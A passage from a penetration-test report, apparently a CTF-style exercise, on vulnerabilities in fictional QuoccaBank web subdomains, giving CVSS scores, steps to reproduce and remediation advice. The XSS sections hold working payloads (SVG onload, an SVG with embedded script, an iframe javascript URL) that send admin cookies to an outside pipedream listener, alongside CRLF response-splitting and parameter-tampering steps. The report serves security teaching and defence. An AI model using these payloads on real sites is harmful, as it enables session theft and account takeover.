| Access Vector (AV)       | **Network (N)** - The attack can only be exploited over a network. We assume the vulnerable website is connected to the Internet, as this is a common deployment.|
| Attack Complexity (AC)   | **Low (L)** - The attacker can expect repeatable success.|
| Privileges Required (PR) | **None (N)** - The attacker requires no privileges to perform the attack.|
| User Interaction (UI)    | **Required (R\)** - An admin needs to click the report.|
| Scope (S)                | **Changed (C\)** - An exploited vulnerability can affect resources beyond the security scope managed by the security authority of the vulnerable component. In this case, the stored XSS affects all victims that visit the report.|
| Confidentiality (C\)     | **Low (L)** - Information in the admin's browser can be read by the malicious JavaScript code and sent to the attacker.|
| Integrity (I)            | **Low (L)** - Information in the admin's browser can be modified by the malicious JavaScript code.|
| Availability (A)         | **None (N)** - The malicious JavaScript code cannot significantly impact the admin's browser.|

**CVSS Base Score: 6.1 (MEDIUM)**

### Steps to Reproduce
This vulnerability is found on the report.quoccabank.com domain, particularly `robots.txt`
- Visiting `robots.txt` exposes a subdirectory `/view` however going to the page directly returns a `400` status code with the error message `missing report id`
![](https://i.imgur.com/WO7Tiwk.png)
*Error resposne when visiting `/view`*
- By submitting a report, a session cookie is returned. `eyJyZXBvcnRzIjpbeyIgYiI6IlpqVmxNbVUzTXpVdFlUVTNaQzAwWWpRMUxUZ3dOR0V0WWpFeVlqbGtORFprTjJNeSJ9XX0.YPzQSQ.3OA3Uoedp-SQYIloXQMXxI4IeBs`
- Base64 decoding it reveals that a report id `f5e2e735-a57d-4b45-804a-b12b9d46d7c2` and thus we can now visit the report at `/view/f5e2e735-a57d-4b45-804a-b12b9d46d7c2`.
- HTTPOnly is on which means that you cannot use javascript to expose the cookie.
- Since the title parameter is reflected in the the response header, you can use Response Splitting with CRLF to expose the cookies. 
- By inserting `\r\n` into the `name` parameter using burp, you can trick the server to prematurely end the header, exposing data into the page content which was previously inaccessible.
![](https://i.imgur.com/3o010AK.png)
*Header data exposed into page content*
- Now to retrieve the content of the page (and thus the cookies), you can bypass the xss filter by using the payload below.
```javascript=
<object></object>
<svg/onload=fetch(`https://en4wk9uin6mam8n.m.pipedream.net/?cookie=${document.documentElement.outerText}`)
>hi<
```
- This payload sends the content of the page to your own server
![](https://i.imgur.com/H9tqMWZ.png)
*Response of the stolen cookies on our server*
- Now by combining these two vulnerabilities we can craft our exploit to steal the admins cookies. 
![](https://i.imgur.com/Wl4tvfY.png)
*Request to the server with the final payload*
### Impact
#### Technical Risk
It is possible for an attacker to impersonate an admin if session cookies were to be stolen, which enables them to carry out actions only possible by an admin. This includes reading inaccessible information such as more bug reports, exposing possible vulnerabilities which an attacker can leverage to find more dangerous exploits.

#### Business Risk
As the first and last name of visitors are shown on the front page, if an attacker was to gain access to that information, it would raise privacy concerns. As a result lawsuits may arise.

### Remediation
This XSS can be alleviated in several ways. The ideal method is to filter input on arrival. At the point where user input is received, filter as strictly as possible based on what is expected or valid input. Although not a perfect solution, this will make XSS attacks harder to perform, dissuading potential attackers.

The next step would to be encode data on output. At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.

Additional solutions include:
- Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
- Content Security Policy. As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
- Avoid copying user-crontrollable data into HTTP response header.

For more information on XSS visit [PortSwigger's Cross-site Scripting](https://portswigger.net/web-security/cross-site-scripting).
For more information on HTTP response header injection visit [PortSwigger's HTTP response header injection](https://portswigger.net/kb/issues/00200200_http-response-header-injection).
For more information on HTTP Response Splitting visit [OWASP HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting).

<div class="pagebreak"> </div>

## 1.9. ctfproxy2.quoccabank.com/api/flagprinter-v2
**Threat - Web Parameter Tampering**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - Performed via use of hidden HTML form fields and  parameter tampering. |
| Attack Complexity (AC)   | **Low (L)** - Following the instructions below is all that's needed. |
| Privileges Required (PR) | **Low (L)** - The user only needs to be authenticated and anyone can make an account. |
| User Interaction (UI)    | **None (N)** - Can be performed solely by the malicious actor. |
| Scope (S)                | **Changed (C\)** - The exploited vulnerability can affect resources beyond the scope managed by the authority of the vulnerable component. |
| Confidentiality (C\)     | **Low (L)** - Access to unauthorised resources is possible and depending on the resource, may contain confidential information. |
| Integrity (I)            | **None (N)** - No modification of data is possible unless the impacted API provides that degree of freedom. |
| Availability (A)         | **None (N)** - No impact to availability is expected. |

**CVSS Base Score: 5.0 (MEDIUM)**

### Steps to Reproduce
This threat is located on the ctfproxy2.quoccabank.com/api/flagprinter-v2 domain, pertaining to how it checks authenticated users for authorisation to access its resources.
- We note that on the API page itself, there is a hidden field with the name "internal" right above the search box with its value set to `0`. By flipping it to `1` and clicking the search button, we observe that an "internal" API is now available to see called "flagprinter-v2".
![](https://i.imgur.com/gcUKiIn.png)
*Screenshot of hidden field named "internal".*
![](https://i.imgur.com/I7j0eUU.png)
*We see flagprinter-v2 now in the API list.*
![](https://i.imgur.com/z5juxJy.png)
*Result of attempting to access the API URL.*
- We head to the "Deploy" page and intercept the request made to see it sends a JSON payload to the server. Increasing the JSON elements sent from `{"name":"a","origin":"a.com","description":"a"}` to `{"name":"a","origin":"a.com","description":"a","blah":"wow"}` for example, returns an error message like the below that divulges the existence of the `dependsOn` element.
![](https://i.imgur.com/MkKsPDN.png)
*Error message says `json: unknown field "blah", valid fields are name, origin, description, dependsOn`.*
- Putting a string into the `dependsOn` element results in this error message:
![](https://i.imgur.com/cOlnwSR.png)
*Error message says `json: cannot unmarshal string into Go struct field Message.dependsOn of type []string`*
- Observing the `type []string`, we understand it to mean a list/array of strings and so it results in our payload looking like: 
```json=
{
    "name": "print_flag",
    "origin": "flagprinter-v2.quoccabank.com",
    "description": "prints flag?",
    "dependsOn": [
        "flagprinter-v2"
    ]
}
```
- After enabling the API we created at its URL `https://ctfproxy2.quoccabank.com/enable/print_flag`, we attempt to access it to find out that we're still not allowed access to it.
![](https://i.imgur.com/JHUU9F0.png)
*No access. Needs API key.*
- We instead try accessing https://ctfproxy2.quoccabank.com/api/flagprinter-v2 to find out that the `dependsOn` flag "enabled" the internal API for us.
![](https://i.imgur.com/GhhKQKQ.png)
*At last, access!*

### Impact
#### Technical Risk
The availability of a hidden, client-side parameter means that any user with access to the page can access the internal APIs as desired. Depending on the nature of the internal API, it could range from something harmless to an API for employee or money management that would be devastating.
Furthermore, the existence of error messages that leak debug information provides malicious actors with ideas on how to exploit the application. 

#### Business Risk
As mentioned in the Technical Risk section above, due to the ability to load a variety of APIs, the aftermath from such an attack could be widespread and adverse. 
Sinister examples entail site hijacking, data breaches, malicious payload upload and malevolent file hosting. All of these attacks not only compromise the domain, but encroach other branches of QuoccaBank's operations including threatening financial transactions, breaching confidential data, blackmailing, data farming and countless risks. This not only has the potential to throw the greater organisation into disarray, but creates a nightmare for the public relations departments and executive staff which attempt to clean up and address distraught clients, shareholders, the media and the public. 

### Remediation
Our recommendation would be to not leak debug information when invalid data is received. Simply returning text with `error` would be sufficient. In our case the leakage of the `dependsOn` parameter resulted in access to other APIs.

Subsequently, hidden/additional parameters should not be processes when passed as input. They should simply be ignored or even return an error. 

For more information on information disclosure see [PortSwigger's Information Disclosure](https://portswigger.net/web-security/information-disclosure) and for Web Parameter Tampering refer to [PortSwigger's Parameter Disclosure](https://owasp.org/www-community/attacks/Web_Parameter_Tampering)

<div class="pagebreak"> </div>

## 1.10. ctfproxy2.quoccabank.com/api/flagprinter
**Threat - API Key Verification Misconfiguration**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - The vulnerable component is bound to the network stack, i.e. remotely exploitable. |
| Attack Complexity (AC)   | **Low (L)** - Specialised access conditions do not exist. |
| Privileges Required (PR) | **Low (L)** - The attacker requires privileges that provide basic user capabilities that normally affect only settings and files owned by a user. |
| User Interaction (UI)    | **None (N)** - The vulnerable component can be exploited without interaction from any user. |
| Scope (S)                | **Changed (C\)** - The exploited vulnerability can affect resources beyond the scope managed by the authority of the vulnerable component. |
| Confidentiality (C\)     | **Low (L)** - Access to some restricted information is obtained, but the attacker does not have control over what information is obtained. |
| Integrity (I)            | **None (N)** - There is no loss of integrity within the impacted component. |
| Availability (A)         | **None (N)** - There is no impact to availability within the impacted component. |

**CVSS Base Score: 5.0 (MEDIUM)**

### Steps to Reproduce
This threat is located on the ctfproxy2.quoccabank.com domain, relating to how the flagprinter.quoccabank.com domain does not follow the specification and check the authenticated user for authorisation.
- To access the APIs page visible in the header, we create an account.
![](https://i.imgur.com/EBkIwJG.png) *List of APIs*
- We note that the site cannot be accessed by either the api address nor the origin/internal address.
![](https://i.imgur.com/unCrAfr.png) *Message returned from flagprinter API address instructing the authenticated user to "enable" the API.*
![](https://i.imgur.com/7NMJRn0.png) *Error returned when API cannot be enabled.*
![](https://i.imgur.com/I9pzKIh.png) *Error returned when attempting to access the Origin/Internal URL*
- We head to the "Deploy" page and create our own endpoint that sets the origin to the `flagprinter.quoccabank.com` website.
```json=
{
    "name": "flag-printer",
    "origin": "flagprinter.quoccabank.com",
    "description": "prints flag?"
}
```
- After enabling the API, we can visit the end point.
![](https://i.imgur.com/Fz0QeDb.png)
*Result of accessing the flag-printer API after enabling it.*

### Impact
#### Technical Risk
The flagprinter.quoccabank.com site was found to have no form of API key verification. This allows any public user to deploy and access the sensitive API which was previously disabled by admin.

This vulnerability allows the user to create malicious APIs. An API allows applications or components of applications to communicate with each other over the Internet or a private network which may potentially open the window for exploitation through commonly available client-side inspection and hacking tools.

In this case, the API bypasses the authorisation check to a supposedly "disabled" API and gives you access to it by simply using a different API address to the existing one.
#### Business Risk
The ability to access unauthorised APIs have ramifications that vary depending on the type of API and its capabilities in question. It can extend as far as privilege escalation depending on the checks involved on the API's end which could lead to actions being performed under the name of QuoccaBank without the foreknowledge of the management.

QuoccaBank risks not only the exposure of sensitive information and the accompanying bad press and lawsuits, but the modification of important files and/or identity theft are well within the possibilities of a vulnerability like this.

### Remediation

We recommend that flagprinter.quoccabank.com endpoint check that the ctfproxy2-key matches the pre-shared key before addressing the request. This ensures that the server is actually receiving a request from the ctfproxy and not from an untrusted source.

In addition, these API keys must periodically be changed. Instead of using one unique API key with all requests, regenerate the API key periodically.

Furthermore, old API keys must be invalidated. This ensures that if a old API key is compromised then the system will securely function.

It is also recommended that ctfproxy2 should ensure that every deployed API is enforcing proper setup practices.

Subsequently, one should not rely exclusively on API keys to protect sensitive, critical or high-value resources. See [OWASP REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html) for more information on securing APIs.

<div class="pagebreak"> </div>

## 1.11. profile.quoccabank.com
**Threat - Stored XSS in SVG image**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - The vulnerable component is bound to the network stack, i.e. remotely exploitable.    |
| Attack Complexity (AC)   | **Low (L)** - The exploit is repeatable without the requirement of system specific reconnaissance or dealing with race conditions.|
| Privileges Required (PR) | **None (N)** - An attacker must possess some user level privileges to store the malicious scripts in the vulnerable  |
| User Interaction (UI)    | **Required (R\)**  - Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited. In this case, an Admin needs to view the page specified by the attacker.       |
| Scope (S)                | **Changed (C\)** - The vulnerability is in the web server, but the malicious scripts execute in the victim’s browser on their machine.         |
| Confidentiality (C\)     | **None (N)** - There is no loss of confidentiality within the impacted component.        |
| Integrity (I)            | **None (N)** - There is no loss of integrity within the impacted component.       |
| Availability (A)         | **Low (L)** - There is some impact to availability within the impacted component.       |

**CVSS Base Score: 4.7 (MEDIUM)**

### Steps to Reproduce
This vulnerability is found on the profile.quoccabank.com domain, in the image upload section of the page. Users can upload a malign image causing the vulnerability.
- For this vulnerability, the websites offers an upload image option which indicate that it may be vulnerable to the Scalable Vector Graphics (SVG) Cross Site Scripting (XSS) attack.
- We first use [pipedream](https://pipedream.com/) or [webhook](https://webhook.site) to setup a listening domain.
- Next, click the browse button and upload the following SVG payload which contains a fetch script deirected to our domain with a query concatenated with the viewer's cookie.

```xml=
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
      fetch("https://en4wk9uin6mam8n.m.pipedream.net/?a=" + document.cookie)
   </script>
</svg>
```

![](https://i.imgur.com/TmEdXD1.png)
*SVG uploaded*

- After submitting the image, righ click on the Image and choose to open Image in  new tab to get the URL of the payload SVG image
 ![](https://i.imgur.com/euDAwvS.png)
*right click*

![](https://i.imgur.com/bZCfNQo.png)
*URL of the suspicious Image*

- In order to get admin to access the malicious link, click on `Report this Profile to Admin` button and intercept the request using burpsuite.
- Encode the URL of the profile Image using URL encoding and put it in Burp Suite

![](https://i.imgur.com/YxxYfc5.png)
*Change the path in burpsuite*
- After forwarding the request, the payload successfully executed on the Admins account and thus expose their cookies.

![](https://i.imgur.com/yrBcCJP.png)
*Cookies on admin's account*

### Impact
#### Technical Risk
By hosting a malicious script on the student's page, attackers are able to steal and exfiltrate the cookie for any user which views the page, and in its extremity, target those with positions of power such as administrators or moderators. Doing so would grant the attacker the ability to login and masquerade themselves as the administrator, bestowing them escalated privileges (i.e. authorisation to create, update, deletion) that could prove both destructive in vandalism or could be used as a stepping-stone for a larger attack.
#### Business Risk
Damage to this domain not only directly impacts QuoccaBank's reputation negatively, but its consumers' and clients' privacy. Attackers could leak user information gleaned from the un-authenticated access to their accounts, selling or distributing confidential information. This opens up the business to potential lawsuits for the negligence causing a breach of privacy.
### Remediation
This XSS is caused due to the web-application trusting the user-data provided to be safe. This threat can be mitigated in several ways, most methods involving ensuring that any malicious user data is stripped or removed. Methods include:
- Sanitize SVG files using libraries such as [DOMPurify](https://github.com/cure53/DOMPurify)
- Convert the SVG to another format server-side (such as PNG) and then display the new image.
- If possible, don't accept SVG files and only accept raster images like PNG, JPEG etc.
- Validate file headers/[signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) don't rely on just the file extension.
- Supply an accurate non-generic Content-Type header, the X-Content-Type-Options: nosniff header, and also a Content-Disposition header that specifies that browsers should handle the file as an attachment.

For more information visit: [OWASP On XSS prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) and [PortSwigger's File Upload Functionality](https://portswigger.net/kb/issues/00500980_file-upload-functionality).

<div class="pagebreak"> </div>

## 1.12. science-today.quoccabank.com (Reflected XSS)
**Threat - Reflected XSS in Query Field**
### Details
| Metric                   | Description |
| ------------------------ | ----------- |
| Access Vector (AV)       | **Network (N)** - The vulnerable component is bound to the network stack, i.e. remotely exploitable.    |
| Attack Complexity (AC)   | **Low (L)** - Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.|
| Privileges Required (PR) | **None (N)** -  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the the vulnerable system to carry out an attack. |
| User Interaction (UI)    | **Required (R\)**  - Successful exploitation of this vulnerability requires a user to take some action before the vulnerability can be exploited. In this case, an Admin needs to view the page specified by the attacker.       |
| Scope (S)                | **Unchanged (U)** - The exploited vulnerability can only affect resources managed by the same authority.         |
| Confidentiality (C\)     | **None (N)** - There is no loss of confidentiality within the impacted component.        |
| Integrity (I)            | **None (N)** - There is no loss of integrity within the impacted component.       |
| Availability (A)         | **Low (L)** - Performance is reduced or there are interruptions in resource availability. Even if repeated exploitation of the vulnerability is possible, the attacker does not have the ability to completely deny service to legitimate users.       |

**CVSS Base Score: 4.3 (MEDIUM)**

### Steps to Reproduce
This vulnerability is found on the science-today.quoccabank.com domain, in the search section of the page. Users can query the comments, which can be abused to perform the attack.
- The filter comment option simply reflects the input as a search query in the URL
- Initial testing with payloads such as `<iframe src="javascript:alert(1)"></iframe>` show that the domain is susceptible to reflected XSS attacks
- We thus will a payload that will exfiltrate data to a public facing listener of our choosing. Websites such as [pipedream](https://pipedream.com/) or [webhook](https://webhook.site) allow an attacker to simply setup a listening and public-facing domain easily.
- A potential payload looks like:
```javascript=
<iframe src="javascript:fetch('https://en4wk9uin6mam8n.m.pipedream.net/?a=' + document.cookie)"></iframe>
```
![](https://i.imgur.com/mF5aEiO.png)
*Insertion point for the script*

- Once the filter comments button has been clicked, the URL of the page changes to include the JavaScript. Reporting the page to admin will result in the Admin's credentials being stolen and sent to the domain specified.

![](https://i.imgur.com/ZdX0kmE.png)
*Response returned to the specified domain*

### Impact
#### Technical Risk
The theft of an admin cookie essentially allows any user with this cookie to replace their own, granting them admin privileges to modify or edit the site. This can prove chaotic to the domain as its effects are seen by everyone. More capable attackers could use an admin position here in order to try further attacks against associated domains which thus potentially endangers others.
#### Business Risk
Although this domain is nothing but a science blog, its audience may be impacted by any changes an attacker makes. Graffiti and vandalism could disrupt the user experience or tarnish the reputation of Quoccabank. Furthermore, if the site was to be disabled by the attacker, the user experience would decline drastically, affecting the user's perspective of Quoccabank's reliability.
### Remediation
The core of XSS threats are a result of untrusted data failing to be verified by the domain. Untrusted data includes that of direct user input, API calls and 3rd party systems, user influenced input (cookies, web storage, HTTP header values), Databases, Internal sources, Config files and more.

A well-secured site would ensure this data stays in 'slots' and cannot break out. Developers should not put untrusted data in places such as Scripts, HTML comments, attribute and tag names nor CSS itself.

HTML encoding is required for HTML bodies but other contexts requires attribute encoding (For HTML attributes), JavaScript encoding (For Javascript data values) or URL encoding(For HTML URL Parameters) in order to be well - protected.

Various other preventions include: Avoid JavaScript URLs, Sanitize HTML Markup with a Library Designed for the Job.

There are many other preventions can be found on the subsequent report: [OWASP On XSS prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).

In our case, URL encoding is required for putting the user query into URL. This should prevent the query from being executed as a script, rather as a string query.

<div class="pagebreak"> </div>

# 2. Conclusions
## 2.1. Summary

QuoccaBank's claims of its security has once again been tested by our team and our conclusion on it is that it is woefully insufficient. While QuoccaBank have adopted increasingly modern industry practices, some have been implemented in such a way that they provide less security than intended, while others are at best a splash of chrome on one panel of glass despite leaving every other glass transparent. QuoccaBank's increasingly bolder comments on the monetary amount it has spent on its new security measures has the team worried of the possibility of the client's security being compromised in a far greater manner than initially suspected. The results of the subdomains covered in this penetration test report indicates that while improvements were made compared to our first report, almost all of them are still vulnerable in some way or another due to unsanitised code or incomplete adoption of ideas and advice we raised in our first report.

We maintain that as security researchers, we do not claim to be experts in business and societal opinions. However, based on experience and worldly knowledge (whether it be from news or mentors) thanks to forerunners in the industry, as well as extremely public *mishaps* by internationally renowned businesses and institutions - we can foresee the likely issues that may arise from the continued existence of the security issues outlined in this report. Summarised below, they include issues such as how:

- QuoccaBank is a private, financial institution; it answers to shareholders who decide the fate of the business at even the slightest rumour.
- QuoccaBank is a financial institution; no person or entity would put their money in the hands of someone they cannot trust.
- QuoccaBank is a financial institution; even before trust completely crashes, the government may see fit to suspend or withdraw QuoccaBank's licence to operate within this country.
- QuoccaBank's negligent handling of web-systems may expose the privacy of both systems and users, potentially opening the company to lawsuit, legal troubles or government interventions.
- Any security breaches regarding QuoccaBank would reach media outlets, amongst other communication that would seriously damage its reputation.

If any of the above happens, the name "QuoccaBank" and its operators may lose all trust and reputation it has and hinder the future activities or operations of any future endeavours by anyone associated with "QuoccaBank". An exceedingly unfortunate end for an issue otherwise easily avoided.

To that end, we heavily recommend that "QuoccaBank" fixes the issues described to its best ability in the shortest time-frame possible. For a quick, easy-to-view list of issues, please see the appended [One-Look Vulnerability Table](##One-look-Vulnerability-Table).

<div class="pagebreak"> </div>

### Vulnerabilities
Through our time spent testing, we have discovered a wide arrange of flaws inclusive of XSS (stored and reflected in places such as HTML, URL and SVG images), JSONP Script element injection, HTTP response splitting, incorrect CSP configurations, SQL injections, insecure API key verification, hidden HTML form fields and SSRF.

This comprehensive list is proof that the systems in-place are far from secure and more drastic measures should be required to patch and fix these threats.

### Remediations

Due to the variety of vulnerabilities, providing a summary of remediations is not conducive to actually solving the problem due to the time it would take. Many of the vulnerabilities can be easily solved by disabling certain features. Others, with a quick search-and-replace. We highly recommend seeking:

- [OWASP's Cheat Sheet](https://cheatsheetseries.owasp.org/)
- [Port Swigger's Web Security Academy](https://portswigger.net/web-security)
- [Mozilla's Web Security Guidelines](https://infosec.mozilla.org/guidelines/web_security)

to read since they provide quick, easy to understand solutions to all the common problems known. In fact, we have also referred to the above websites in search of industry-standard solutions.

Additionally, one can reference the [National Vulnerability Database](https://nvd.nist.gov/) in order to crosscheck existing systems and tools with found exploits and vulnerabilities in the field.

In order to ensure the implementation of strong systems in the future, we highly recommend following a reputable standards and specification for designing framework. An excellent example would be the **Australian Government's Information Security Manual** which can be [found and downloaded here](https://www.cyber.gov.au/acsc/view-all-content/ism)

### DevSecOps
Our security team strongly supports the notion that having security as a mindset throughout the development cycle leads to more and better secured systems and reduces the consumption of time and resources (both personnel and financial) towards removing security issues and flaws from the system. This belief is known commonly as **DevSecOps** as security has been adopted to all spheres and fields of development operations.

We advise that QuoccaBank's development team should be pro-active in ensuring that future projects, both large and small, are more securely built. This starts with raising awareness through tactics such as source-code auditing, familiarisation with bugs an exploits, moving through to educating developers through the attacker's lens with 'capture the flag' challenges and bug-bounty encouragements. 

Adoption of this mindset will see widespread success across platforms, now and in the far future.

For more information, see [RedHat's article on DevSecOps](https://www.redhat.com/en/topics/devops/what-is-devsecops)

<div class="pagebreak"> </div>

## 2.2. Final Conclusions

We were pleased to be approached by QuoccaBank in their quest to improve their service's security and we remain adamant that it was the right choice to make. While we are confident that we did not manage to find every vulnerability and sadly cannot provide remediations for the ones we could not find, we believe it shows that not only should one never relinquish vigilance, but that there are always better security options - considering that a team new to the industry like us could discover this many vulnerabilities.
Security is a cat-and-mouse chase to patch holes (ideally) before malicious actors find and/or exploit them. As humans are fallible creatures, we believe that while vulnerabilities remain online, QuoccaBank will be far more secure if they adopt the practices we recommend. 

We thank QuoccaBank for the opportunity provided and wish QuoccaBank the best of luck in their future endeavours. As someone once wisely put - *"constant vigilance"*.

<div class="pagebreak"> </div>

# 3. Appendix
## 3.1. Additional Vulnerabilities
We were able to confirm that a vulnerability exists within support-v2.quoccabank.com and wallet.quoccabank.com through the security research network, however due to time constraints, we were unable to determine the nature of the vulnerability. We advise QuoccaBank to review the infrastructure to patch the vulnerability or seek consultation from a reputable cyber-security firm.

<div class="pagebreak"> </div>

## 3.2. csp.quoccabank.com
### Insecure Content Security Policy Configuration
The website csp.quoccabank.com was found to have an insecure Content Security Policy (CSP) configuration. It contained a web application which allowed a user to modify the site's CSP header.

Granting a user the ability to control the CSP header enables a malicious actor to bypass content security restrictions and potentially achieve remote code execution via Cross Site Scripting (XSS). 

### Steps to Reproduce
#### Challenge 1
Upon inspection of the browser console, we notice the following:
1. The page fails to execute a script because it is missing either ``'unsafe-inline'``, a hash
(`'sha256-R+A6ELN3JPMHUe0uf6qIRigpfMFEvnoKN/xNPiAbOdc='`), or a nonce (`'nonce-...'`)
2. The page attempts to load an image from the domain `unsplash.it`

![](https://i.imgur.com/2EgFfNp.png)
*Script refuses to load due to violating Content Security Policy Directive*
Further examination of the page source reveals the nonce `2726c7f26c` contained within a script tag of the HTML.

![](https://i.imgur.com/KgSt0Td.png)
*Nonce found in the script tag*
To allow this script to execute, we simply update the CSP `script-src` directive with the missing hash and nonce.
```=
script-src 'self' ssl.google-analytics.com 'sha256-R+A6ELN3JPMHUe0uf6qIRigpfMFEvnoKN/xNPiAbOdc=' 'nonce-2726c7f26c';
```

Visiting the URL https://unsplash.it/200/200 redirects us to another domain `i.picsum.photos` where we are presented with a random photo. By appending both these domains to the `img-src` directive, we are able to successfully load images on the site.

```=
img-src 'self' ssl.google-analytics.com unsplash.it i.picsum.photos picsum.photos;
```

The final CSP header is as follows:
```=
default-src 'none';
script-src 'self' ssl.google-analytics.com 'sha256-R+A6ELN3JPMHUe0uf6qIRigpfMFEvnoKN/xNPiAbOdc=' 'nonce-2726c7f26c';
style-src 'self' maxcdn.bootstrapcdn.com fonts.googleapis.com;
img-src 'self' ssl.google-analytics.com unsplash.it i.picsum.photos picsum.photos;
font-src fonts.gstatic.com maxcdn.bootstrapcdn.com
```

##### Challenge 2
By appending the keyword `'strict-dynamic'` to the `script-src` directive, we are able to successfully load the quote using the script. This ignores the `self` allow-list to allow the quote script to be loaded.

The updated CSP header is shown below.
```=
default-src 'none';
script-src 'nonce-onyDVMyUbCMVPCJc7AaTdA==' 'self' ssl.google-analytics.com 'strict-dynamic';
style-src 'self' maxcdn.bootstrapcdn.com fonts.googleapis.com;
font-src fonts.gstatic.com maxcdn.bootstrapcdn.com;
img-src 'self' ssl.google-analytics.com
```


## 3.3. Web Servers
Depending on the web server used to receive the HTTP request, a forward slash `/`, or URL-based query `?a=` may be needed appended to your URL and encoded into base64 as required.

## 3.4. One-look Vulnerability Table
TODO - need to embed or append PDF in later.
<iframe src="https://docs.google.com/spreadsheets/d/e/2PACX-1vS6xIkPMPa_nUC2rDumlgJnlKDhbjRcuyirOkNcw8y5ZkSfQS5trj62bmv5EUVpq0egc_FEZR8shLpf/pubhtml?gid=994230576&amp;single=true&amp;widget=true&amp;headers=false"></iframe>

<div class="pagebreak"> </div>

# 4. Glossary

**Access Control List (ACL)**
A mechanism that implements access control for a system resource by listing the identities of the system entities that are permitted to access the resource.

**Application Programming Interface (API)**
An API is a set of definitions and protocols for building and integrating application software.

**Cascading Style Sheets (CSS)**
Cascading Style Sheets (CSS) is a style sheet language used for describing the presentation of a document written in a markup language such as HTML.

**The Common Vulnerability Scoring System (CVSS)**
The Common Vulnerability Scoring System (CVSS) is an open framework for communicating the characteristics and severity of software vulnerabilities.

**Content Security Policy (CSP)**
Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement to distribution of malware.

**Cookie**
Data exchanged between an HTTP server and a browser (a client of the server) to store state information on the client side and retrieve it later for server use. An HTTP server, when sending data to a client, may send along a cookie, which the client retains after the HTTP connection closes. A server can use this mechanism to maintain persistent client-side state information for HTTP-based applications, retrieving the state information in later connections.

**CRLF Injection**
The term CRLF refers to Carriage Return (ASCII 13, \r) Line Feed (ASCII 10, \n). A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.

**Cross Site Scripting (XSS)**
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.

**Domain**
A sphere of knowledge, or a collection of facts about some program entities or a number of network points or addresses, identified by a name. On the Internet, a domain consists of a set of network addresses. In the Internet's domain name system, a domain is a name with which name server records are associated that describe sub-domains or host. In Windows NT and Windows 2000, a domain is a set of network resources (applications, printers, and so forth) for a group of users. The user need only to log in to the domain to gain access to the resources, which may be located on a number of different servers in the network.

**Encoding**
Encoding is the process of converting data into a format required for a number of information processing needs.

**Fetch API**
The Fetch API provides an interface for fetching resources (including across the network). It will seem familiar to anyone who has used XMLHttpRequest, but the new API provides a more powerful and flexible feature set.

**Header**
A header is the extra information in a packet that is needed for the protocol stack to process the packet.

**HyperText Markup Language (HTML)**
The set of markup symbols or codes inserted in a file intended for display on a World Wide Web browser page.

**HyperText Transfer Protocol (HTTP)**
The protocol in the Internet Protocol (IP) family used to transport hypertext documents across an internet.

**JavaScript Object Notation (JSON)**
JSON (JavaScript Object Notation) is a lightweight data-interchange format.

**JSON with Padding (JSONP)**
JSONP, or JSON-P (JSON with Padding), is an historical JavaScript technique for requesting data by loading a <script\> element, which is an element intended to load ordinary JavaScript.

**Payload**
Payload is the actual application data a packet contains.

**Regular Expression (REGEX)**
A way to broadly describe a string of words or characters without necessarily specifying the spelling of individual words. It provides a way to match character combinations in string for purposes like "matching" for verification, "locating" a pin in a haystack, or "managing" the text in general.
Please visit [regular-expressions.info's reference page](https://www.regular-expressions.info/reference.html) for a detailed, text reference on Regular Expressions. Please visit a site like [regex101.com](https://regex101.com/) or [regexr.com](https://regexr.com/) to experience and experiment with Regular Expressions. All sites also function as a reference of sorts.

**Scalable Vector Graphics (SVG)**
Scalable Vector Graphics (SVG) are an XML-based markup language for describing two-dimensional based vector graphics.

**Script**
A script is a program or sequence of instructions that is interpreted or carried out by another program rather than by the computer processor (as a compiled program is).

**Server-side request forgery (SSRF)**
Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

**Web Application Firewall (WAF)**
Like a firewall that runs on a computer or a gate with guards in real life, a web application firewall sits between the public HTTP traffic in the internet and the application that is the website. Depending on how the WAF is programmed, it filters and/or monitors the traffic that passes through the WAF to help protect the website and servers from malicious actors. Cloudflare, a popular central distribution network provider has a clear and easy to understand article on WAFs [here](https://www.cloudflare.com/en-au/learning/ddos/glossary/web-application-firewall-waf/).

<div class="pagebreak"> </div>

# 5. References

*Content-Security-Policy Header ⟶ CSP Reference & Examples* 2021,
Accessed 25 July 2021,
\<https://content-security-policy.com/\>

*Cross Site Scripting Prevention - OWASP Cheat Sheet Series* 2021,
Accessed 21 July 2021,
\<https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\>

*CSP: script-src - HTTP | MDN* 2021,
